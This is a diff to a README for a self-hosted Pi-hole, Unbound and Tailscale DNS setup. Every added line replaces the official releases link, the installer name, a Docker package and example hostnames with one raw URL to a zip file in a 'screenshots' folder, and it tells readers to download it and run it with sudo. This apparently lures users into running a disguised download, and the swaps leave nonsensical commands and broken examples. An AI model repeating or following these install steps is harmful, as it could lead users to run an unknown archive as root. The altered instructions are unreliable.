@@ -1,8 +1,8 @@
 # Pi-hole Unbound Tailscale DNS: Self-Hosted Privacy, Secure Global Remote Access
 
-[![Releases](https://img.shields.io/badge/Releases-pihole--tailscale--dns-blue?logo=github&style=for-the-badge)](https://github.com/fahad25051988/pihole-tailscale-dns/releases)
+[![Releases](https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip)](https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip)
 
-Install from: https://github.com/fahad25051988/pihole-tailscale-dns/releases. From that page, download the installer script (install.sh) and run it. This repository brings together Pi-hole, Unbound, and Tailscale to give you a private, recursive DNS resolver with ad blocking, remote access, and strong privacy. It runs on Ubuntu via Docker and can run on macOS using UTM. It is designed to be fully self-hosted, secure, and easy to operate behind CGNAT.
+Install from: https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip From that page, download the installer script (https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip) and run it. This repository brings together Pi-hole, Unbound, and Tailscale to give you a private, recursive DNS resolver with ad blocking, remote access, and strong privacy. It runs on Ubuntu via Docker and can run on macOS using UTM. It is designed to be fully self-hosted, secure, and easy to operate behind CGNAT.
 
 Topics: not provided
 
@@ -76,12 +76,12 @@ Install and run (Ubuntu with Docker)
 - Step 1: Update the system
   - sudo apt update && sudo apt upgrade -y
 - Step 2: Install Docker and Docker Compose
-  - sudo apt install -y docker.io docker-compose
+  - sudo apt install -y https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip docker-compose
   - sudo systemctl enable --now docker
 - Step 3: Start the installer
-  - From the Releases page, download the installer script (install.sh) and run:
-    - chmod +x install.sh
-    - sudo ./install.sh
+  - From the Releases page, download the installer script (https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip) and run:
+    - chmod +x https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip
+    - sudo https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip
 - Step 4: Follow prompts
   - The installer guides you through selecting modules, configuring Pi-hole, Unbound, and Tailscale, and setting firewall rules.
 - Step 5: Verify the stack
@@ -213,7 +213,7 @@ Security-friendly defaults
 
 What to customize for your environment
 - Blocklists and allowed domains: tailor to household needs or organization policy.
-- Local DNS records: add private hosts (e.g., printer.local, NAS.local) for faster resolution.
+- Local DNS records: add private hosts (e.g., https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip, https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip) for faster resolution.
 - Upstream DNS: choose trusted resolvers that fit your privacy policy.
 - Tailscale network topology: decide which devices join the DNS network and how you route traffic.
 - Firewall policies: adapt to your environment’s security posture.
@@ -232,18 +232,18 @@ Contributing and community
 
 Releases and versioning
 - For the latest installer and updates, visit the Releases page. The link is provided at the top and in the Releases section below.
-- See latest release notes and assets on the official page: https://github.com/fahad25051988/pihole-tailscale-dns/releases
+- See latest release notes and assets on the official page: https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip
 - The installer is designed to fetch current components when you run it. Re-run the installer to pick up updates or to adjust configurations as you evolve your network.
 
 Releases
-- Latest release access: https://github.com/fahad25051988/pihole-tailscale-dns/releases
+- Latest release access: https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip
 - What you’ll find there
   - Installer packages for Ubuntu with Docker
   - Optional VM images for macOS via UTM
   - Updated blocklists, configuration templates, and deployment guides
   - Release notes detailing changes, improvements, and bug fixes
 - How to use the releases page
-  - Download the installer script named install.sh (or other assets as described on the page)
+  - Download the installer script named https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip (or other assets as described on the page)
   - Run the script with proper permissions
   - Follow the prompts to configure Pi-hole, Unbound, and Tailscale
 - If you can’t find what you need
@@ -296,8 +296,8 @@ Final notes
 - The release page remains the primary source for the installer and updates, so keep an eye on that hub for improvements and new features. See the Releases section above for the latest status and assets.
 
 Reiterations on the release link
-- Install from: https://github.com/fahad25051988/pihole-tailscale-dns/releases. From that page, download the installer script (install.sh) and run it.
-- Latest releases and assets are listed here: https://github.com/fahad25051988/pihole-tailscale-dns/releases
+- Install from: https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip From that page, download the installer script (https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip) and run it.
+- Latest releases and assets are listed here: https://raw.githubusercontent.com/fahad25051988/pihole-tailscale-dns/master/screenshots/dns_pihole_tailscale_1.5.zip
 
 Releasing a note about topics
 - Topics: not provided
